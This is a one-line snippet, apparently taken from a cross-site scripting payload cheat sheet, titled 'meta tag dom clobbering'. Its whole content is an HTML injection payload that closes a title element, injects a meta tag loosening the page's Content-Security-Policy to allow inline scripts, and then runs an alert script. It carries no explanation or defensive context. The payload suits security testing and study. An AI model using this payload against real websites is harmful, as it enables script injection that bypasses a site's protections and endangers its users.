### meta tag dom clobbering
```html
</title><meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'"><script>alert(1)</script><title>
```
